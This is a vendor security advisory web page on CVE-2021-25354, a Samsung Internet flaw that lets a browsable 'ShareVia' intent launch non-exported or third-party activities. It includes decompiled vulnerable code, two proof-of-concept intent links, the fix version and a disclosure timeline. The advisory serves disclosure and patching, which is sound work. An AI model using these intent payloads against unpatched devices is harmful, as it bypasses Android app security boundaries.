<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Samsung Galaxy - Open Activities Via Samsung Browser</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/open-activities-via-samsung-browser/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/open-activities-via-samsung-browser/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/open-activities-via-samsung-browser/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Samsung Galaxy - Open Activities Via Samsung Browser</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Android devices with Samsung Internet (prior to version 13.2.1.46)</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>Medium</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2021-25354</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>Application security bypass</td>
          </tr>
        </table>
        
        <h2>Description</h2><p>F-Secure looked into exploiting the Samsung S20 device for Tokyo Pwn2Own 2020. An issue was discovered that allowed a specific browsable intent in Samsung Browser (com.sec.android.app.sbrowser) to either:</p><ul>
<li>Launch non-exported activities in the Samsung Browser application</li>
<li>Launch an exported activity in any installed application</li>
</ul><p>Note that while this issue was found on a Samsung Galaxy device, the Samsung Internet browser application is available on the Google Play store and can be installed on any Android device with access to said store. It was confirmed that this issue could be exploited on any Android device that had the Samsung Internet application installed</p><h2>Technical Details</h2><p><span>The issue is due to the class "com.sec.android.app.sbrowser.capsule.BixbySBrowserLauncherActivity" methods "handleIntent" and "handleShareVia". First, "handleIntent" does the following:</span></p><ul>
<li><span>Parses the passed intent and establishes the URI "data" from the intent's data</span></li>
<li><span>Parses the URI "data" and establishes the list "pathSegments" from the URI's path segments</span></li>
<li><span>If the first item in the list "pathSegments" is "ShareVia", then the method "handleShareVia" is executed</span></li>
</ul><pre>private void handleIntent(final Intent intent) {<br>    final String action = intent.getAction();<br>    final Uri data = intent.getData();<br>    int n = 1;<br>    if ("android.intent.action.VIEW".equals(action) &amp;&amp; data != null) {<br>        final String string = data.toString();<br>        final List pathSegments = data.getPathSegments();<br>        if ((this.mPathSegments = (List&lt;String&gt;)pathSegments) != null) {<br>            if (pathSegments.size() != 0) {<br>                final String pathSegments2 = this.getPathSegments(0);<br>                if (pathSegments2 == null) {<br>                    return;<br>                }<br>            Label_0738: {<br>                switch (pathSegments2.hashCode()) {<br>                ...<br>                    case -679124017: {<br>                        if (pathSegments2.equals("ShareVia")) {<br>                            n = 4;<br>                            break Label_0738;<br>                        }<br>                        break;<br>                }<br>                ...<br>            switch (n) {<br>                ...<br>                case 4: {<br>                    this.handleShareVia();<br>                    break;<br>                }</pre><p>Next, "handleShareVia" does the following:</p><ul>
<li>Creates a new intent "createIntentWithTargetTask"</li>
<li>Checks if the second item in the list "pathSegments" is "result_type_success"</li>
<li>Checks if the third and fouth items in the list "pathSegments" are not null</li>
<li>If the fourth item in the list "pathSegments" is not "com.sec.android.app.sbrowser.ReceiveWeChatMomentActivity", then assign the following "createIntetWithTargetTask" extra values:</li>
<ul>
<li>"packageName" = the third item in the list "pathSegments"</li>
<li>"activityName" = the fourth item in the list "pathSegments"</li>
</ul>
<li>Start the activity outlined in the intent "createIntentWithTargetTask"</li>
</ul><pre>private void handleShareVia() {<br>    String pathSegments = getPathSegments(1);<br>    if (pathSegments != null) {<br>        Intent createIntentWithTargetTask = createIntentWithTargetTask("com.sec.android.app.sbrowser.INTENT_SHARE_VIA");<br>        createIntentWithTargetTask.putExtra("resultType", pathSegments);<br>        if ("result_type_success".equals(pathSegments)) {<br>            String pathSegments2 = getPathSegments(2);<br>            String pathSegments3 = getPathSegments(3);<br>            if (pathSegments2 != null &amp;&amp; pathSegments3 != null) {<br>                if (pathSegments3.equals("com.sec.android.app.sbrowser.ReceiveWeChatMomentActivity") &amp;&amp; !this.isWeChatAvailable()) {<br>                    Log.d("BixbyLauncherActivity", "WeChat is not installed!");<br>                    createIntentWithTargetTask.putExtra("resultType", "result_type_fail");<br>                } else {<br>                    createIntentWithTargetTask.putExtra("packageName", pathSegments2);<br>                    createIntentWIthTargetTask.putExtra("activityName", pathSegments3);<br>                }<br>            } else {<br>                return;<br>            }<br>        ...<br>        try {<br>            getApplicationContext().startActivity(createIntentWithTargetTask);<br>        } catch (ActivityNotFoundException e) {<br>            Log.d("BixbyLauncherActivity", "[handleShareVia]" + e.toString());<br>        }<br>    }<br>}</pre><p>Using this information, it is possible to create a custom intent that launches a specific activity:</p><pre>intent://com.sec.android.app.sbrowser/ShareVia/result_type_success/&lt;package name&gt;/&lt;activity name&gt;</pre><p>The following example browsable intent link will launch the non-exported component "com.sec.android.app.sbrowser/com.google.zxing.client.android.SecCaptureActivity" in the Samsung Browser application:</p><pre>&lt;a href="intent://com.sec.android.app.sbrowser/ShareVia/result_type_success/com.sec.android.app.sbrowser/com.google.zxing.client.android.SecCaptureActivity/#Intent;scheme=samsunginternet;action=android.intent.action.VIEW;package=com.sec.android.app.sbrowser;end"&gt;click here&lt;/a&gt;</pre><p>By replacing the appropriate fields, it is also possible to launch activities that are exported in other applications. The following browsable intent link will launch the exported component "com.sec.android.app.myfiles/com.sec.android.app.myfiles.external.ui.PickerActivity":</p><pre>&lt;a href="intent://com.sec.android.app.sbrowser/ShareVia/result_type_success/com.sec.android.app.myfiles/com.sec.android.app.myfiles.external.ui.PickerActivity/#Intent;scheme=samsunginternet;action=android.intent.action.VIEW;package=com.sec.android.app.sbrowser;end"&gt;click here&lt;/a&gt;</pre><h2>Remedial Action</h2><p>Samsung has released Samsung Browser version 13.2.1.46 which fixes the issue outlined in this advisory. F-Secure recommends that users upgrade Samsung Browser to at least version 13.2.1.46.</p><h2>Timeline</h2><table>
<thead>
<tr>
<td>Date</td>
<td>Summary</td>
</tr>
</thead>
<tbody>
<tr>
<td>02/11/2020</td>
<td>Issue disclosed to Samsung Mobile Security</td>
</tr>
<tr>
<td>02/11/2020</td>
<td>Issue assigned to a Samsung Security Analyst</td>
</tr>
<tr>
<td>12/01/2021</td>
<td>Follow up sent to Samsung</td>
</tr>
<tr>
<td>17/01/2021</td>
<td>Samsung confirms the vulnerability and rates it as a moderate risk issue</td>
</tr>
<tr>
<td>09/02/2021</td>
<td><span>Patch released, Samsung initiates process for bug bounty reward</span></td>
</tr>
<tr>
<td>12/03/2021</td>
<td><span>Bug Bounty Paid</span></td>
</tr>
<tr>
<td>25/03/2021</td>
<td><span>CVE published by Samsung</span></td>
</tr>
<tr>
<td>26/03/2021</td>
<td><span>Advisory published</span></td>
</tr>
</tbody>
</table>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/open-activities-via-samsung-browser/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/open-activities-via-samsung-browser/&text=Samsung Galaxy - Open Activities Via Samsung Browser" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/open-activities-via-samsung-browser/&title=Samsung Galaxy - Open Activities Via Samsung Browser" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/open-activities-via-samsung-browser/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
